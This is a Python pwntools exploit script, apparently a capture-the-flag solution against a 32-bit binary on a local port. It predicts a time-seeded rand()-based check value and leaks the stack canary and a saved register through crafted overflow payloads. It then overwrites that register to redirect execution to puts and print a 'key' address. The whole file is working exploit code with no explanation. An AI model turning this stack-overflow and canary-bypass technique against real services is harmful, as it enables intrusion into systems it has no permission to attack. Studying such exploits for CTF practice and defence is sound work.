from pwn import *
import time
from ctypes import *

puts = 0x0804881E  #0x08048620
key  = 0x0804A0A0

cdll.LoadLibrary("libc.so.6")
libc = CDLL("libc.so.6")
libc.srand(libc.time(None))

#prine hex(libc.rand() * libc.rand() * libc.rand())

def get_canary():
	v3 = libc.rand() #& 0xffffffff
	v4 = (libc.rand() * v3) #& 0xffffffff
	v5 = libc.rand()# & 0xffffffff
	v10 = (v4 * v5) & 0xffffffff
	return (v10)

r = remote("0", 1234)

# overwrite v9
get_canary()
print r.recv()
r.sendline("1")
print r.recv()
data = "A"*100 + '\xff'
r.sendline(data)
print r.recv()
time.sleep(1.5)

# leak stack canary
print r.recv()
canary1 = get_canary()
r.sendline("1")
print r.recv()
pay = ""
pay += "A"*104
pay += p32(canary1)
pay += "A"
r.sendline(pay)
print r.recvuntil(pay)
canary2 = u32('\x00'+r.recv(3))
canary2_1 = canary2 + 1
print "canary2 : " + hex(canary2)
r.recv()
time.sleep(1.5)

# leak ecx
print r.recv()
canary1 = get_canary()
r.sendline("1")
print r.recv()
pay = ""
pay += "A"*104
pay += p32(canary1)
pay += p32(canary2_1)
r.sendline(pay)
print r.recvuntil(pay)
ecx = u32(r.recv(4))
print "ecx : " + hex(ecx)
#ecx = ecx - 4 - 0x18
#print "ecs over : " + hex(ecx)
r.recv()
time.sleep(1.5)

# overwire ecx
print r.recv()
canary1 = get_canary()
r.sendline("1")
print r.recv()
pay = ""
pay += "A"*104
pay += p32(canary1)
pay += p32(canary2)
pay += p32(ecx)
pay += "A"*24
pay += p32(puts)
pay += "AAAA"
pay += p32(key)
r.sendline(pay)
print r.recv()
time.sleep(1.5)

# ret
print r.recv()
r.sendline("2")
print r.recv()
time.sleep(1.5)
print r.recv()




